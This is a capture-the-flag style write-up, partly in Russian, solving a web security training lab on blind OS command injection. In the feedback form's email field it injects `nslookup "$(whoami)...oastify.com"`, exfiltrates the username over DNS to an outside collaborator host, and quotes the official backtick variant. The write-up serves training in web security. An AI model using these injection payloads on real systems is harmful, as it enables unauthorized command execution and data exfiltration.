# Blind OS command injection with out-of-band data exfiltration
PRACTITIONER

This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, execute the whoami command and exfiltrate the output via a DNS query to Burp Collaborator. You will need to enter the name of the current user to complete the lab.

Note

To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

## Решение
Для обращения к серверу коллаборатора использовал команду nslookup, для передачи имени пользователя добавил к скопированному из коллаборатора домену команду whoami, заключённую в `$()`:

`email=test%40server.com;nslookup "$(whoami).5u0ccsbrbb0c5mal5dpuzfwxkoqfe82x.oastify.com";`
```
POST /feedback/submit HTTP/2
Host: 0a3a003e035d5cf280ea17be00040078.web-security-academy.net
Cookie: session=L6K83a1qKWSdaYCPS1N12t7RWZUWlWBM
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 162
Origin: https://0a3a003e035d5cf280ea17be00040078.web-security-academy.net
Referer: https://0a3a003e035d5cf280ea17be00040078.web-security-academy.net/feedback
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

csrf=919HSKFtg11ZBQbEnVRRqn9qgkgSjS4r&name=test&email=test%40server.com;nslookup "$(whoami).5u0ccsbrbb0c5mal5dpuzfwxkoqfe82x.oastify.com";&subject=foo&message=123
```
Значение поля Description отловленного коллаборатором запроса:
```
The Collaborator server received a DNS lookup of type A for the domain name peter-2O2SYV.5u0ccsbrbb0c5mal5dpuzfwxkoqfe82x.oastify.com.  The lookup was received from IP address 3.251.104.4:44252 at 2024-Apr-14 08:29:34.958 UTC.
```
Отправляю `peter-2O2SYV` в Submit solution. Задание выполнено.

Официальное решение. Команда встраивается в параметр для nslookup через косые кавычки:
```
email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
```